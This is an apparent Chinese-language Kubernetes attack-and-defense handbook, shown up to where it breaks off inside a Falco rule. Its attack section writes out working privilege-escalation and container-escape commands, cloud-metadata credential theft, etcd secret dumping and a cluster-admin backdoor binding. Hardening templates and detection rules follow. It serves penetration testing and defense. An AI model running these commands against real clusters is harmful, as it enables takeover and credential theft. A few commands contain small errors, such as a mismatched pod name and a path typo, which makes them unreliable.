---
name: kubernetes-security
description: >
  Kubernetes 全栈安全攻防手册：覆盖集群渗透测试（API Server 未授权、etcd
  暴露、RBAC 提权、容器逃逸、Service Account 滥用）、加固（Pod Security
  Standards/Admission、RBAC 最小权限、Network Policy/Calico 策略、OPA
  Gatekeeper 策略引擎、etcd 加密与审计）以及云原生 K8s 安全（托管集群
  EKS/GKE/AKS 安全组配置、节点硬ening）。内置 RBAC 审计命令表、Network
  Policy 模板库、K8s ATT&CK 矩阵速查。
domain: cybersecurity
subdomain: container-infrastructure-security
tags:
  - kubernetes
  - container-security
  - rbac
  - network-policy
  - pod-security
  - etcd
  - opa-gatekeeper
  - calico
  - kubesec
  - cloud-native
version: 2.0.0
---

# Kubernetes Security — 完整攻防手册

## 适用场景

- 对 K8s 集群进行渗透测试（攻击面枚举 → RBAC 提权 → 容器逃逸 → 集群接管）
- 审计集群 RBAC 配置、Network Policy、Pod Security Standards 合规性
- 加固托管集群（EKS/GKE/AKS）或自建集群安全态势
- 事后响应：K8s 安全事件调查、etcd 取证、审计日志分析

**不适用**：纯容器镜像安全扫描（见 container-security-scanning）、CI/CD 流水线安全（见 devsecops-ci-cd）

## 前置条件

- kubectl、helm、jq、yq 已安装
- 对目标集群有至少一个 ServiceAccount 的 kubeconfig（渗透场景）或 cluster-admin 权限（审计场景）
- 了解 K8s 核心对象（Pod、Deployment、Service、Role/RoleBinding、NetworkPolicy）

---

## Part A：攻击方法论

### 1. 侦察与攻击面枚举

#### 1.1 集群信息收集

```bash
# 版本与组件信息
kubectl version --short 2>/dev/null
kubectl get nodes -o wide
kubectl cluster-info

# 枚举所有命名空间
kubectl get namespaces

# 枚举所有 API 资源（发现非标准 CRD）
kubectl api-resources | grep -i custom

# 检查当前 ServiceAccount 权限
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i '*' '*'  # wildcard check
```

#### 1.2 网络暴露面扫描

```bash
# 扫描 K8s API Server 默认端口
nmap -sS -p 6443,8443,2379,2380,10250,10255,10256,30000-32767 <TARGET>

# etcd 直接暴露（严重漏洞）
curl -k https://<TARGET>:2379/v2/keys/
ETCDCTL_API=3 etcdctl --endpoints=https://<TARGET>:2379 --insecure-transport=true get / --prefix

# kubelet 未授权访问（10250）
curl -k https://<TARGET>:10250/pods
curl -k https://<TARGET>:10250/runningpods

# kubelet 只读端口（10255，已废弃但可能仍在用）
curl http://<TARGET>:10255/pods

# 匿名认证检查
kubectl --kubeconfig=anonymous-config get pods -n default 2>&1
```

#### 1.3 ServiceAccount Token 提取

```bash
# 自动挂载的 SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 解码 token（JWT）
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# 在 Pod 内用 token 调用 API
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/pods
```

### 2. RBAC 提权攻击

#### 2.1 高危 Role 权限矩阵

| 权限 | 危害 | 提权路径 |
|------|------|----------|
| `pods/exec` | 在任意 Pod 执行命令 | 访问特权 Pod 的文件系统 |
| `secrets.get` | 读取集群 Secret | 获取其他 SA token |
| `pods.create` | 创建 Pod | 挂载 hostPath 获取节点 root |
| `pods.create` + `hostPID: true` | 创建共享 PID 命名空间 | nsenter 进入宿主 |
| `serviceaccounts.token.create` | 创建 SA token | 模拟任意 SA |
| `rolebindings.create` | 创建 RoleBinding | 绑定 cluster-admin |
| `certificatesigningrequests.create` | 创建 CSR | 签发集群证书 |
| `pods.portforward` | 端口转发 | 访问 Pod 内未暴露服务 |

#### 2.2 提权利用

```bash
# 枚举当前 SA 可绑定的 Role
kubectl get rolebindings,clusterrolebindings -A -o json | \
  jq '[.items[] | select(.subjects[]?.name=="<SA_NAME>") | .roleRef]'

# 如果有 pods.create 权限 → 创建特权 Pod 逃逸
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: default
spec:
  containers:
  - name: privesc
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
  hostPID: true
  hostNetwork: true
EOF

# 在特权 Pod 内逃逸到宿主
kubectl exec privesc -- nsenter -t 1 -m -u -i -n -- /bin/bash

# 如果有 secrets.get 权限 → 获取其他 SA token
kubectl get secrets -n kube-system -o name
kubectl get secret <SECRET_NAME> -n kube-system -o jsonpath='{.data.token}' | base64 -d

# 如果有 rolebindings.create → 自绑 cluster-admin
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:compromised-sa
```

#### 2.3 RBAC 审计脚本

```bash
# 查找所有 cluster-admin 绑定
kubectl get clusterrolebindings -o json | jq -r '.items[] |
  select(.roleRef.name=="cluster-admin") |
  .subjects[]? | "\(.kind)/\(.name) in \(.namespace // "cluster-scope")"'

# 查找过度宽松的 Role（wildcard 权限）
kubectl get clusterroles -o json | jq -r '.items[] |
  select(.rules[]?.verbs[]? == "*" or .rules[]?.resources[]? == "*") |
  .metadata.name'

# 查找可以创建 Pod 的 Role（提权起点）
kubectl get roles,clusterroles -A -o json | jq -r '.items[] |
  select(.rules[]?.resources[]? == "pods" and .rules[]?.verbs[]? == "create") |
  "\(.kind)/\(.metadata.name)"'

# 查找可以读取 Secret 的 Role
kubectl get roles,clusterroles -A -o json | jq -r '.items[] |
  select(.rules[]?.resources[]? == "secrets" and
        (.rules[]?.verbs[]? == "get" or .rules[]?.verbs[]? == "list")) |
  "\(.kind)/\(.metadata.name)"'

# 查找可以 exec 进 Pod 的 Role
kubectl get roles,clusterroles -A -o json | jq -r '.items[] |
  select(.rules[]?.resources[]? == "pods/exec") |
  "\(.kind)/\(.metadata.name)"'
```

### 3. 容器逃逸技术

#### 3.1 特权容器逃逸

```bash
# 检查当前 Pod 是否为特权容器
cat /proc/1/status | grep -i cap
cat /proc/self/status | grep CapEff
# 如果 CapEff = 0000003fffffffff → 完全特权

# 方法 1：通过 hostPath 挂载逃逸
# （见 2.2 中 privesc-pod 示例）

# 方法 2：cgroup 逃逸（CVE-2022-0492 等）
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "<HOST_PATH>/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'ps aux > /output' >> /cmd && chmod +x /cmd
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"

# 方法 3：通过 /proc/sys/kernel/core_pattern
echo "|/path/to/malicious_script" > /proc/sys/kernel/core_pattern

# 方法 4：通过挂载 docker.sock（如存在）
find / -name docker.sock 2>/dev/null
# 如果找到
docker -H unix:///run/docker.sock run -v /:/host -it alpine chroot /host
```

#### 3.2 Kubernetes CVE 利用速查

| CVE | 影响 | 利用条件 | K8s 版本 |
|-----|------|----------|----------|
| CVE-2018-1002105 | API Server 代理绕过 | 任何能发起 API 请求的用户 | <1.12.4 |
| CVE-2019-11253 | API Server DoS | 未认证 | <1.14.7, <1.15.4 |
| CVE-2020-8554 | 中间人攻击 | 外部 IP 的 Service | 所有 |
| CVE-2020-8558 | kubelet localhost 绕过 | 网络可达 | <1.18.4 |
| CVE-2021-25741 | hostPath 子路径遍历 | 可创建 Pod | <1.22.1 |
| CVE-2022-3162 | 未认证 API 访问 | 网络可达 | <1.25.4 |
| CVE-2023-2727 | Aggregated API Server 未授权 | 启用 Aggregated API | <1.27.1 |
| CVE-2024-21626 | runc 容器逃逸 | 使用 runc | <1.1.12 |

### 4. etcd 攻击

```bash
# 检查 etcd 认证状态
ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_HOST>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  auth status

# 如果 etcd 无认证
ETCDCTL_API=3 etcdctl --endpoints=http://<ETCD_HOST>:2379 get / --prefix --keys-only

# 提取所有 Secret
ETCDCTL_API=3 etcdctl --endpoints=<URL> get /registry/secrets --prefix | strings

# 提取所有 ConfigMap（可能含敏感配置）
ETCDCTL_API=3 etcdctl --endpoints=<URL> get /registry/configmaps --prefix | strings

# 检查 etcd 加密配置
kubectl get encryptionconfiguration -o yaml 2>/dev/null
# 如果 encryptionConfiguration 不存在或使用 identity provider → Secret 未加密
```

### 5. 云托管集群特有攻击

```bash
# AWS EKS — 节点角色枚举
kubectl get nodes -o jsonpath='{.items[*].spec.providerID}'

# AWS EKS — 通过 IRSA 获取云权限
# 在 Pod 中访问 IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GKE — 元数据服务
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# AKS — 托管标识
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## Part B：检测与防御

### 6. Pod Security Standards 实施

#### 6.1 Pod Security Admission 配置

```yaml
# Pod Security Admission — 命名空间级别标签
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: v1.28
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: v1.28
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: v1.28
---
# 三级策略对照
# privileged: 不限制（仅用于系统组件）
# baseline: 禁止 hostPID/hostNetwork/hostIPC、privileged、hostPath（新增能力需白名单）
# restricted: 在 baseline 基础上强制 runAsNonRoot、drop ALL capabilities、readonlyRootFilesystem
```

#### 6.2 Restricted Pod 安全上下文模板

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: app:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    resources:
      limits:
        memory: "256Mi"
        cpu: "500m"
      requests:
        memory: "128Mi"
        cpu: "100m"
```

### 7. RBAC 最小权限加固

```bash
# Step 1: 审计现有绑定
kubectl get clusterrolebindings -o json | jq -r '.items[] |
  select(.roleRef.name=="cluster-admin") |
  {name: .metadata.name, subjects: [.subjects[]?.name]}'

# Step 2: 移除不必要的 cluster-admin
kubectl delete clusterrolebinding <BINDING_NAME>

# Step 3: 创建最小权限 Role 模板
cat <<'ROLEEOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer
  namespace: default
rules:
- apiGroups: ["", "apps"]
  resources: ["pods", "pods/log", "deployments"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["", "apps"]
  resources: ["deployments"]
  verbs: ["create", "update", "patch", "delete"]
  resourceNames: []  # 留空 = 所有，可限制特定名称
- apiGroups: [""]
  resources: ["secrets"]
  verbs: []  # 明确禁止
ROLEEOF

# Step 4: 使用 kubectl auth can-i 验证
kubectl auth can-i list pods --as=system:serviceaccount:default:dev-sa
kubectl auth can-i get secrets --as=system:serviceaccount:default:dev-sa

# Step 5: 启用 RBAC 审计日志
# kube-apiserver 启动参数添加
--audit-log-path=/var/log/kubernetes/audit.log
--audit-log-maxage=30
--audit-log-maxbackup=10
--audit-log-maxsize=100
--audit-policy-file=/etc/kubernetes/audit-policy.yaml
```

#### 7.1 审计策略配置

```yaml
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # 记录所有 Secret 访问
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["secrets"]
  # 记录 RBAC 变更
  - level: RequestResponse
    resources:
    - group: "rbac.authorization.k8s.io"
      resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
    verbs: ["create", "update", "patch", "delete"]
  # 记录 Pod 创建（检测特权 Pod）
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["pods"]
    verbs: ["create"]
  # 记录 exec/attach/port-forward
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["pods/exec", "pods/attach", "pods/portforward"]
  # 其他请求仅记录元数据
  - level: Metadata
    omitStages:
    - "RequestReceived"
```

### 8. Network Policy 实施

#### 8.1 默认拒绝策略（零信任基础）

```yaml
# 默认拒绝所有入站
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
---
# 默认拒绝所有出站
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Egress
---
# 默认拒绝所有方向
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

#### 8.2 Calico 高级策略

```yaml
# Calico GlobalNetworkPolicy — 比 K8s NetworkPolicy 更灵活
apiVersion: projectcalico.org/v3
kind: GlobalNetworkPolicy
metadata:
  name: deny-all-non-whitelisted
spec:
  selector: all()
  order: 1000
  types:
  - Ingress
  - Egress
  ingress:
  - action: Allow
    selector: has(k8s-app)  # 仅允许带 k8s-app 标签的通信
  egress:
  - action: Allow
    destination:
      ports:
      - 53
      - 443
    protocol: UDP
  - action: Allow
    destination:
      ports:
      - 53
      - 443
    protocol: TCP
---
# 限制 DNS 隧道：仅允许 CoreDNS
apiVersion: projectcalico.org/v3
kind: GlobalNetworkPolicy
metadata:
  name: restrict-dns
spec:
  selector: all()
  order: 500
  types:
  - Egress
  egress:
  - action: Allow
    protocol: UDP
    destination:
      selector: k8s-app == "kube-dns"
      ports:
      - 53
  - action: Deny
    protocol: UDP
    destination:
      ports:
      - 53
```

#### 8.3 分层网络策略模板

```yaml
# 前端 → 后端 通信
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-to-backend
  namespace: app
spec:
  podSelector:
    matchLabels:
      tier: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          tier: frontend
    ports:
    - protocol: TCP
      port: 8080
---
# 后端 → 数据库 通信
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-to-database
  namespace: app
spec:
  podSelector:
    matchLabels:
      tier: database
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          tier: backend
    ports:
    - protocol: TCP
      port: 5432
```

### 9. OPA Gatekeeper 策略引擎

#### 9.1 安装与配置

```bash
# 安装 Gatekeeper
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml

# 验证安装
kubectl get pods -n gatekeeper-system
```

#### 9.2 关键约束模板

```yaml
# 禁止特权容器
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sprivilegedcontainer
spec:
  crd:
    spec:
      names:
        kind: K8sPrivilegedContainer
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sprivilegedcontainer
      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        container.securityContext.privileged == true
        msg := sprintf("Privileged container is forbidden: %v", [container.name])
      }
      violation[{"msg": msg}] {
        container := input.review.object.spec.initContainers[_]
        container.securityContext.privileged == true
        msg := sprintf("Privileged init container is forbidden: %v", [container.name])
      }
---
# 应用约束
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPrivilegedContainer
metadata:
  name: deny-privileged
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    excludedNamespaces: ["kube-system"]
```

```yaml
# 禁止 hostPath 挂载
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockhostpath
spec:
  crd:
    spec:
      names:
        kind: K8sBlockHostPath
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sblockhostpath
      violation[{"msg": msg}] {
        volume := input.review.object.spec.volumes[_]
        has_host_path(volume)
        msg := sprintf("hostPath volume is forbidden: %v", [volume.name])
      }
      has_host_path(v) {
        v.hostPath
      }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockHostPath
metadata:
  name: block-host-path
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
```

```yaml
# 强制资源限制
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredresources
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredResources
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequiredresources
      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not container.resources.limits
        msg := sprintf("Container <%v> must have resource limits", [container.name])
      }
      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not container.resources.limits.cpu
        msg := sprintf("Container <%v> must have CPU limit", [container.name])
      }
      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not container.resources.limits.memory
        msg := sprintf("Container <%v> must have memory limit", [container.name])
      }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredResources
metadata:
  name: require-resource-limits
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    - apiGroups: ["apps"]
      kinds: ["Deployment", "StatefulSet", "DaemonSet"]
```

### 10. etcd 加固

```bash
# 检查 etcd 当前加密状态
ETCDCTL_API=3 etcdctl get /registry/secrets/default/mysecret \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/peer.crt \
  --key=/etc/kubernetes/pki/etcd/peer.key \
  --write-out=json | jq '.kvs[0].value' -r | base64 -d | strings
# 如果输出明文 → 未加密

# 启用 Secret 加密
cat <<'EOF' > /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
    - secrets
    providers:
    - aescbc:
        keys:
        - name: key1
          secret: <BASE64_ENCODED_32BYTE_KEY>
    - identity: {}
EOF

# kube-apiserver 添加参数
--encryption-provider-config=/etc/kubernetes/encryption-config.yaml

# 加密现有 Secret
kubectl get secrets --all-namespaces -o json | kubectl replace -f -

# 启用 etcd TLS 双向认证
# etcd 启动参数
--client-cert-auth=true
--trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
--cert-file=/etc/kubernetes/pki/etcd/server.crt
--key-file=/etc/kubernetes/pki/etcd/server.key
--peer-client-cert-auth=true
--peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
--peer-cert-file=/etc/kubernetes/piki/etcd/peer.crt
--peer-key-file=/etc/kubernetes/pki/etcd/peer.key
```

### 11. Manifest 安全扫描（kubesec）

```bash
# 安装 kubesec
go install github.com/controlplaneio/kubesec/v2/cmd/kubesec@latest

# 扫描单个 Manifest
kubesec scan deployment.yaml

# 扫描目录下所有 Manifest
find . -name "*.yaml" -exec kubesec scan {} \;

# 使用 kubectl 输出实时扫描
kubectl get deploy -n default -o yaml | kubesec scan /dev/stdin

# CI/CD 集成
kubesec scan deployment.yaml -j | jq '.[] | select(.score < 5) | .scoring.advise'
```

### 12. 云托管集群加固

#### 12.1 EKS 加固

```bash
# 启用控制平面日志
aws eks update-cluster-config --name <CLUSTER> \
  --logging '{"clusterLogging":[{"types":["api","audit","authenticator","controllerManager","scheduler"],"enabled":true}]}'

# 启用 Secret 加密（KMS）
aws eks associate-encryption-config --name <CLUSTER> \
  --encryption-config '[{"resources":["secrets"],"provider":{"keyArn":"arn:aws:kms:..."}}]'

# 节点安全组最小化
aws ec2 authorize-security-group-ingress \
  --group-id <SG_ID> --protocol tcp --port 443 \
  --source-security-group-id <CONTROL_PLANE_SG>

# IMDSv2 强制（防止 SSRF 获取凭证）
aws ec2 modify-instance-metadata-options \
  --instance-id <ID> --http-tokens required \
  --http-endpoint enabled
```

#### 12.2 GKE 加固

```bash
# 启用 Workload Identity
gcloud container clusters update <CLUSTER> --workload-pool=<PROJECT>.svc.id.goog

# 启用 Binary Authorization
gcloud container clusters update <CLUSTER> --enable-binauthz

# 启用 Shielded GKE Nodes
gcloud container clusters update <CLUSTER> --enable-shielded-nodes

# 私有集群配置
gcloud container clusters create <CLUSTER> \
  --private-cluster \
  --master-authorized-networks=<CIDR> \
  --enable-ip-alias \
  --enable-private-nodes \
  --master-ipv4-cidr=172.16.0.0/28

# 禁用默认 Service Account 自动挂载
kubectl patch serviceaccount default -p '{"automountServiceAccountToken":false}'
```

#### 12.3 AKS 加固

```bash
# 启用 Azure Policy for AKS
az aks enable-addons --addons azure-policy --resource-group <RG> --name <CLUSTER>

# 启用 Secret Provider（Azure Key Vault）
az aks enable-addons --addons azure-keyvault-secrets-provider \
  --resource-group <RG> --name <CLUSTER>

# 私有集群
az aks create --resource-group <RG> --name <CLUSTER> \
  --enable-private-cluster \
  --enable-managed-identity

# 限制 API Server 访问
az aks update --resource-group <RG> --name <CLUSTER> \
  --api-server-authorized-ip-ranges <CIDR>
```

### 13. 检测规则

#### 13.1 Sigma 规则 — 特权 Pod 创建

```yaml
title: Privileged Pod Created in Kubernetes
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: production
level: high
description: Detects creation of privileged containers in Kubernetes
author: security-team
date: 2024/01/01
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: 'create'
    objectRef.resource: 'pods'
    requestObject.spec.containers.securityContext.privileged: true
  condition: selection
falsepositives:
  - System components (kube-proxy, CNI plugins)
tags:
  - attack.privilege_escalation
  - attack.t1611
```

#### 13.2 Falco 规则

```yaml
# /etc/falco/falco_rules.local.yaml
- rule: Privileged Container Started
  desc: Detect privileged container start
  condition: >
    container and
    container.privileged=true and
    not proc.pname in (kubelet, docker, containerd)
  output: "Privileged container started (user=%user.name command=%proc.cmdline image=%container.image.repository)"
  priority: WARNING
  tags: [container, privileged, mitre_privilege_escalation]

- rule: Shell Spawned in Container
  desc: Detect shell execution in a container
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh, dash) and
    not proc.pname in (entrypoint, docker-entrypoint)
  output: "Shell spawned in container (user=%user.name container=%container.name shell=%proc.name cmdline=%proc.cmdline)"
  priority: NOTICE
  tags: [container, shell, mitre_execution]

- rule: Contact K8s API Server from Container
  desc: Detect unexpected K8s API calls from container
  condition: >
    container and
    fd.sip="0.0.0.0" and
    fd.sport=443 and
    not container.image.repository in (k8s.gcr.io/*, calico/*, coredns/*)
  output: "K8s API connection from container (image=%container.image.repository connection=%fd.name)"
  priority: WARNING
  tags: [network, k8s, mitre_discovery]
```

---

## 速查表

### K8s ATT&CK 矩阵

| 战术 | 技术 | K8s 对应 | 检测方法 |
|------|------|----------|----------|
| 初始访问 | T1190 Exploit Public App | 未保护 Dashboard/Ingress | API 审计日志 |
| 初始访问 | T1078 Valid Accounts | SA Token 泄露 | 异常 SA 使用 |
| 执行 | T1609 Admin API | kubectl exec | 审计 exec 事件 |
| 执行 | T1610 Container API | 通过 API 创建 Pod | Pod 创建审计 |
| 持久化 | T1136 Create Account | 创建新 SA/RoleBinding | RBAC 变更审计 |
| 持久化 | T1525 Implant Image | 恶意镜像注入 | 镜像签名验证 |
| 提权 | T1611 Escape to Host | 特权容器逃逸 | Falco/运行时检测 |
| 提权 | T1548 Abuse Elevation | RBAC 提权 | RBAC 变更审计 |
| 防御规避 | T1070 Indicator Removal | 清除审计日志 | etcd 完整性检查 |
| 凭证访问 | T1552 Unsecured Creds | Secret 读取/etcd 访问 | Secret 访问审计 |
| 发现 | T1046 Network Service | Service/Port 扫描 | NetworkPolicy 日志 |
| 横向移动 | T1530 Data from Cloud | 利用云 IAM 角色 | IMDS 访问监控 |
| 影响 | T1489 Service Stop | 删除 Deployment | 删除操作审计 |

### 安全加固检查清单

```
[ ] API Server: --anonymous-auth=false
[ ] API Server: --enable-admission-plugins=NodeRestriction,PodSecurityPolicy
[ ] API Server: --audit-log-maxage=30
[ ] API Server: --encryption-provider-config configured
[ ] etcd: --client-cert-auth=true
[ ] etcd: TLS 双向认证启用
[ ] etcd: Secret 数据加密
[ ] kubelet: --anonymous-auth=false
[ ] kubelet: --read-only-port=0
[ ] kubelet: --protect-kernel-defaults=true
[ ] RBAC: 无不必要的 cluster-admin 绑定
[ ] RBAC: 所有 SA 最小权限
[ ] NetworkPolicy: 默认拒绝策略已部署
[ ] NetworkPolicy: 命名空间间隔离
[ ] Pod Security: restricted 级别 enforced
[ ] Pod Security: 禁止 hostPID/hostNetwork/hostIPC
[ ] Pod Security: 禁止 privileged
[ ] Pod Security: runAsNonRoot=true
[ ] Pod Security: readOnlyRootFilesystem=true
[ ] Pod Security: capabilities drop ALL
[ ] OPA Gatekeeper: 策略约束已启用
[ ] Secret: 外部 Secret 管理（Vault/KMS）
[ ] 镜像: 签名验证启用
[ ] 镜像: 使用 distroless 基础镜像
[ ] Runtime: Falco 或类似运行时安全启用
[ ] 日志: 控制平面日志发往 SIEM
[ ] 备份: etcd 定期备份且加密存储
```

### 快速渗透命令表

```
# 1. 信息收集
kubectl auth can-i --list                              # 当前权限
kubectl get pods -A -o wide                            # 所有 Pod
kubectl get secrets -A -o name                         # 所有 Secret 名称

# 2. RBAC 提权
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin")'  # 找 cluster-admin
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:my-sa  # 自绑

# 3. 容器逃逸
kubectl run pwn --image=alpine --restart=Never --overrides='{"spec":{"hostPID":true,"containers":[{"name":"pwn","image":"alpine","command":["nsenter","-t","1","-m","-u","-i","-n","--","/bin/bash"],"securityContext":{"privileged":true}}]}}'

# 4. 凭证窃取
kubectl get secrets -n kube-system -o jsonpath='{.items[?(@.type=="kubernetes.io/service-account-token")].data.token}' | base64 -d

# 5. 持久化
kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin --user=attacker@domain.com
```

---

## Part C：2025-2026 补充 — 新威胁、新工具与新防御

### C.1 2025-2026 关键 CVE 速查

| CVE | 组件 | CVSS | 类型 | 影响版本 | 修复版本 |
|-----|------|------|------|----------|----------|
| CVE-2025-1974 | Ingress-NGINX | **9.8 Critical** | 未认证 RCE（IngressNightmare） | ≤v1.11.4, v1.12.0 | v1.12.1+ |
| CVE-2025-1097 | Ingress-NGINX | 8.6 High | Admission Webhook 信息泄露 | ≤v1.11.4, v1.12.0 | v1.12.1+ |
| CVE-2025-1098 | Ingress-NGINX | 8.2 High | NGINX 路径遍历 | ≤v1.11.4, v1.12.0 | v1.12.1+ |
| CVE-2025-24514 | Ingress-NGINX | 7.5 High | Ingress 对象注入 | ≤v1.11.4, v1.12.0 | v1.12.1+ |
| CVE-2025-23266 | NVIDIA Container Toolkit | **9.0 Critical** | TOCTOU 容器逃逸（NVIDIAScape） | ≤v1.17.7 | v1.17.8+ |
| CVE-2025-15467 | OpenSSL (用于 K8s 组件) | **9.8 Critical** | CMS 栈溢出 Pre-Auth RCE | 多个版本 | 详见 OpenSSL 公告 |
| CVE-2026-31431 | Linux Kernel algif_aead | **7.8 High** | LPE → 容器逃逸（Copy Fail） | Linux 自 2017 年 | Docker v29.4.3+ / 内核补丁 |
| CVE-2024-21626 | runC | 8.6 High | 容器逃逸（Leaky Vessels） | <1.1.12 | v1.1.12+ |
| CVE-2025-8671 | HTTP/2 协议 | 7.5 High | MadeYouReset DDoS | 多版本 | 升级 HTTP/2 栈 |
| CVE-2025-29927 | Next.js (K8s 中间件) | 7.5 High | 中间件授权绕过 | <14.2.25 / <15.2.1 | 升级 Next.js |

### C.2 CVE-2025-1974 深度分析 — "IngressNightmare"

**发现者**: Wiz Research | **披露日期**: 2025-03-24 | **CVSS**: 9.8 Critical

#### 攻击原理

Ingress-NGINX Controller 的 Admission Webhook（端口 8443）处理用户提交的 Ingress 对象时，**未充分净化用户输入**。攻击者可构造恶意 Ingress 对象，在 NGINX 配置生成过程中注入任意指令，导致在 Controller Pod 内执行任意代码。

```
攻击链：
1. 攻击者获得 Pod 网络访问（已有 Pod 或 SSRF）
2. 构造恶意 Ingress YAML → 注入 NGINX 配置指令
3. Admission Webhook 处理 → 注入内容进入 nginx.conf
4. NGINX reload → 执行注入的 Lua/配置指令
5. Controller Pod 内 RCE → 读取集群 Secret/SA Token
6. 利用窃取的 SA Token → 集群接管
```

#### 利用条件

- Ingress-NGINX Controller 部署且 Admission Webhook 启用（默认启用）
- 攻击者可访问 Pod 网络（已有 Pod 或可通过 SSRF 访问）
- **无需任何 K8s RBAC 权限**（只需网络可达 webhook 端口）

#### 检测方法

```bash
# 检查当前 Ingress-NGINX 版本
kubectl get deploy -n ingress-nginx ingress-nginx-controller \
  -o jsonpath='{.spec.template.spec.containers[0].image}'

# 检查 Admission Webhook 是否暴露
kubectl get svc -n ingress-nginx
kubectl get validatingwebhookconfigurations,mutatingwebhookconfigurations | grep nginx

# Falco 检测规则
- rule: Ingress NGINX Suspicious Configuration Reload
  desc: Detect unexpected nginx reload in ingress controller
  condition: >
    container and
    container.image.repository contains "ingress-nginx" and
    proc.name = "nginx" and
